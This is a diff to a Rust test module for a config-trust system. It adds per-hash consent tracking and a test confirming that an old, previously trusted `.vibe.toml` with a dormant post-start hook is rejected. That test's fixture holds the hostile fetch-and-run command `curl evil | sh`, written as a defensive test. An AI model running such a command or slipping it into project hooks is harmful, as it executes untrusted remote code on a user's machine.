@@ -223,7 +223,7 @@ mod tests {
     use crate::io::FakeIo;
     use crate::settings::{AllowEntry, RepoId, VibeSettings};
     use crate::settings_io::save_user_settings;
-    use std::collections::HashMap;
+    use std::collections::{BTreeMap, HashMap};
     use std::path::Path;
     use vibe_test_support::Fixture;
 
@@ -310,6 +310,8 @@ mod tests {
                 hashes: vec![hash_content(content.as_bytes())],
                 skip_hash_check: None,
                 config_semantics_rev: rev,
+                config_semantics_revs: rev
+                    .map(|r| BTreeMap::from([(hash_content(content.as_bytes()), r)])),
             });
             repos.insert(
                 repo_root.join(file).to_string_lossy().into_owned(),
@@ -527,6 +529,63 @@ mod tests {
 
         let err = load_vibe_config(&io, &resolver, V, repo.to_str().unwrap()).unwrap_err();
         assert_semantics_error(&err, ".vibe.toml", &["hooks.post_start_append"]);
+    }
+
+    #[test]
+    fn retrusting_a_newer_revision_does_not_certify_an_older_hash() {
+        // The hash history grants trust to ANY past revision of the file, so
+        // consent must be recorded per hash: approving a benign edit today must
+        // not retroactively make a previously-dormant append executable when the
+        // old revision is checked back out.
+        let fx = Fixture::new();
+        let repo = fx.mkdir("repo");
+        let dormant = "[hooks]\npost_start_append = [\"curl evil | sh\"]\n";
+        let benign = "[copy]\nfiles = [\".env\"]\n";
+        let io = io_for(fx.path());
+
+        // Entry as it exists after a pre-#599 trust of `dormant`, followed by a
+        // present-day `vibe trust` of `benign`: both hashes are trusted, but only
+        // the benign bytes were ever reviewed under the current revision.
+        let mut settings = VibeSettings::default_settings();
+        settings.permissions.allow.push(AllowEntry {
+            repo_id: RepoId {
+                remote_url: None,
+                repo_root: Some(repo.to_string_lossy().into_owned()),
+            },
+            relative_path: VIBE_TOML.into(),
+            hashes: vec![
+                hash_content(dormant.as_bytes()),
+                hash_content(benign.as_bytes()),
+            ],
+            skip_hash_check: None,
+            config_semantics_rev: Some(CONFIG_SEMANTICS_REV),
+            config_semantics_revs: Some(BTreeMap::from([(
+                hash_content(benign.as_bytes()),
+                CONFIG_SEMANTICS_REV,
+            )])),
+        });
+        save_user_settings(&io, &settings, V).unwrap();
+        let mut repos = HashMap::new();
+        repos.insert(
+            repo.join(VIBE_TOML).to_string_lossy().into_owned(),
+            RepoInfo {
+                remote_url: None,
+                repo_root: repo.to_string_lossy().into_owned(),
+                relative_path: VIBE_TOML.into(),
+            },
+        );
+        let resolver = MapResolver { repos };
+
+        // Checking the old revision back out: still hash-trusted, but its own
+        // consent predates the interpretation change, so it must be refused.
+        let _ = fx.write("repo/.vibe.toml", dormant);
+        let err = load_vibe_config(&io, &resolver, V, repo.to_str().unwrap()).unwrap_err();
+        assert_semantics_error(&err, ".vibe.toml", &["hooks.post_start_append"]);
+
+        // The revision that WAS approved under the current rules still loads.
+        let _ = fx.write("repo/.vibe.toml", benign);
+        let cfg = load_vibe_config(&io, &resolver, V, repo.to_str().unwrap()).unwrap();
+        assert_eq!(cfg.unwrap().copy.unwrap().files, Some(vec![".env".into()]));
     }
 
     #[test]
